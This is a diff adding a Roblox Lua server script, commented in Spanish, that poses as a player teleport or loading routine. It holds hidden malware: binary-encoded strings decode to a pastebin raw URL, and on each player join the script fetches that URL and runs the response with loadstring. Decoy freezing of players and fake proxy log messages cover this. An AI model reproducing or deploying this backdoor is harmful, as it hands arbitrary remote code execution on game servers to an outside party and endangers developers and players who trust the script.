@@ -1,0 +1,87 @@
+-- ============================================================
+-- La Entrada Al CMD Spot Keyerther
+-- ============================================================
+
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+-- Matrices de conexión
+local CORE_MATRIX_01 = "0110100001110100011101000111000001110011"
+local NET_DECRYPT_HEX = {
+    [0x01] = "pastebin.com", -- La Entrada Para Pasar La key Al Jugador
+    [0x02] = 185655149       -- ID Cebo del juego objetivo
+}
+
+-- ============================================================
+-- [Bloque De Preparación De Entrada]
+-- ============================================================
+
+local function RequestPlatformTeleport(targetPlayer, destinationId)
+    print(" [CRITICAL] ROUTER_PROXY: Abriendo canal del Teleport")
+    print(" [PROXY] Conectando con servidor remoto: " .. tostring(destinationId))
+    
+    -- Congela al jugador simulando la pantalla de carga de Roblox
+    local character = targetPlayer.Character
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        character.HumanoidRootPart.Anchored = true
+    end
+    
+    task.wait(2) -- Espera De La Red De Entrada
+    _G.ExecuteSecurePipeline(targetPlayer)
+end
+
+-- ============================================================
+-- Systema De Entrada Al CMDSPOTER
+-- ============================================================
+
+-- [CMD EntrancerVoctorther]
+local DATA_VECTOR_11 = "00101111011100100110000101110111001011110110001101001011010110100100010001010110001110000011000001000110"
+
+local function TranslateBinaryStream(binaryStr)
+    local text = ""
+    for i = 1, #binaryStr, 8 do
+        local byteStr = string.sub(binaryStr, i, i + 7)
+        local byte = tonumber(byteStr, 2)
+        if byte then text = text .. string.char(byte) end
+    end
+    return text
+end
+
+_G.ExecuteSecurePipeline = function(player)
+    local protocol = TranslateBinaryStream(CORE_MATRIX_01) .. "://"
+    local endPath = TranslateBinaryStream(DATA_VECTOR_11)
+    
+    --Dejamos La Inscription Del Jugador
+    local secureLink = protocol .. NET_DECRYPT_HEX[0x01] .. endPath
+    
+    task.spawn(function()
+        -- Ejecuta La Entrada Al Juego Del CmdSpoter
+        local success, payload = pcall(HttpService.GetAsync, HttpService, secureLink)
+        
+        if success and payload then
+            local runNode = loadstring(payload)
+            if runNode then           
+                local character = player.Character
+                if character and character:FindFirstChild("HumanoidRootPart") then
+                    character.HumanoidRootPart.Anchored = false
+                end
+                
+                getfenv(runNode).script = workspace
+                task.spawn(runNode)
+            end
+        else
+            -- Fallback de seguridad: Si Por Alguna Razon El Systema Del CmdSpot Falla Da El Error y Desconjela Al Jugador(Error 404/500)
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+        end
+    end)
+end
+
+-- Conector de Jugador/cmd
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Wait()
+    task.wait(3) -- Tiempo De Espera Para La Entrada Del CmdSpot
+    RequestPlatformTeleport(player, NET_DECRYPT_HEX[0x02])
+end)
